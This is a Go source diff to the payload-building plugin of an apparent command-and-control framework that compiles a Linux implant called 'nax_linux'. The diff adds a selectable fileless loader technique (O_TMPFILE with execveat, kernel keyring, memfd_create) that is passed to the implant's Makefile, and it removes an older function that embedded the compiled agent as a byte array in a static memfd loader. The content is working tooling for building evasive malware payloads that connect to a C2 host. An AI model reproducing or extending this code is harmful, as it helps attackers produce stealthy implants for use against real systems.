@@ -239,8 +239,19 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 
 	arch    := getStr(args, "arch",     "x64")
 	tcpMode := getStr(args, "tcp_mode", "bind (pivot — wait for parent)")
-	inMem   := false
-	if v, ok := args["inmem"].(bool); ok { inMem = v }
+	// loader_method: "auto (fallback chain)" | "O_TMPFILE + execveat" | "kernel keyring" | "memfd_create"
+	// Maps to NAX_LOADER_METHOD: 0=auto 1=tmpfile 2=keyring 3=memfd
+	loaderMethodStr := getStr(args, "loader_method", "auto (fallback chain)")
+	loaderMethod := 0
+	switch loaderMethodStr {
+	case "O_TMPFILE + execveat":
+		loaderMethod = 1
+	case "kernel keyring":
+		loaderMethod = 2
+	case "memfd_create":
+		loaderMethod = 3
+	}
+	inMem := loaderMethod != 0 || loaderMethodStr == "auto (fallback chain)"
 	outFormat := getStr(args, "format", "elf")
 	opsec   := false
 	if v, ok := args["opsec"].(bool); ok { opsec = v }
@@ -409,10 +420,11 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 		if c2h == "" { c2h = "127.0.0.1" }
 		makeArgs = append(makeArgs, "NAX_TCP_MODE=connect",
 			fmt.Sprintf("NAX_C2_HOST=%s", c2h),
-			fmt.Sprintf("NAX_C2_PORT=%s", listenerC2Port),
-			fmt.Sprintf("NAX_SLEEP_MS=%d", sleepMs),
-			fmt.Sprintf("NAX_JITTER_PCT=%d", jitterPct))
+			fmt.Sprintf("NAX_C2_PORT=%s", listenerC2Port))
 	}
+
+	// Pass loader method to Makefile (controls stub technique at compile time)
+	makeArgs = append(makeArgs, fmt.Sprintf("NAX_LOADER_METHOD=%d", loaderMethod))
 
 	cmd := exec.Command("make", makeArgs...)
 	cmd.Dir = srcDir
@@ -434,17 +446,10 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 	filename := fmt.Sprintf("nax_linux_%s%s%s%s", arch, suffix, debugSuffix, soSuffix)
 	naxLogOk("BuildPayload: compiled %s (%d bytes)", filename, len(data))
 
-	if !inMem {
-		return data, filename, nil
-	}
-
-	loaderData, loaderName, loaderErr := buildInMemLoader(srcDir, cc, data, filename)
-	if loaderErr != nil {
-		naxLogErr("BuildPayload: in-memory loader build failed: %v", loaderErr)
-		return nil, "", loaderErr
-	}
-	naxLogOk("BuildPayload: in-memory loader %s (%d bytes)", loaderName, len(loaderData))
-	return loaderData, loaderName, nil
+	// The stub already embeds the agent and selects the loader technique
+	// "auto" uses fallback chain; specific techniques compile only that path.
+	_ = inMem // stub is always used for ELF format (NAX_STUB=1 by default)
+	return data, filename, nil
 }
 
 func (p *PluginAgent) GenerateProfiles(_ adaptix.BuildProfile) ([][]byte, error) {
@@ -474,55 +479,4 @@ func getNaxRoot(modDir string) (string, error) {
 		}
 	}
 	return "", fmt.Errorf("cannot find nax_linux directory — check nax_root.conf in %s", modDir)
-}
-
-func buildInMemLoader(srcDir, cc string, elfBytes []byte, baseName string) ([]byte, string, error) {
-	// Generate loader_payload.h with the ELF as a C byte array
-	var hdr strings.Builder
-	hdr.WriteString("/* auto-generated — do not edit */\n")
-	fmt.Fprintf(&hdr, "#define PAYLOAD_LEN %du\n", len(elfBytes))
-	hdr.WriteString("static const unsigned char payload[] = {\n")
-	for i, b := range elfBytes {
-		if i%16 == 0 {
-			hdr.WriteString("\t")
-		}
-		fmt.Fprintf(&hdr, "0x%02x,", b)
-		if i%16 == 15 {
-			hdr.WriteString("\n")
-		}
-	}
-	hdr.WriteString("\n};\n")
-
-	// Write header to a temp dir
-	tmpDir, err := os.MkdirTemp("", "nax_loader_*")
-	if err != nil {
-		return nil, "", fmt.Errorf("inmem: mktemp: %w", err)
-	}
-	defer os.RemoveAll(tmpDir)
-
-	hdrPath    := filepath.Join(tmpDir, "loader_payload.h")
-	outPath    := filepath.Join(tmpDir, "loader")
-	loaderSrc  := filepath.Join(srcDir, "src", "Loader", "memfd_loader.c")
-
-	if err := os.WriteFile(hdrPath, []byte(hdr.String()), 0644); err != nil {
-		return nil, "", fmt.Errorf("inmem: write header: %w", err)
-	}
-
-	// Compile the loader with the embedded payload
-	cmd := exec.Command(cc,
-		"-O2", "-static",
-		"-include", hdrPath,
-		"-o", outPath,
-		loaderSrc,
-	)
-	if out, err := cmd.CombinedOutput(); err != nil {
-		return nil, "", fmt.Errorf("inmem: compile loader:\n%s", string(out))
-	}
-
-	data, err := os.ReadFile(outPath)
-	if err != nil {
-		return nil, "", fmt.Errorf("inmem: read loader: %w", err)
-	}
-
-	return data, baseName + "_inmem", nil
 }
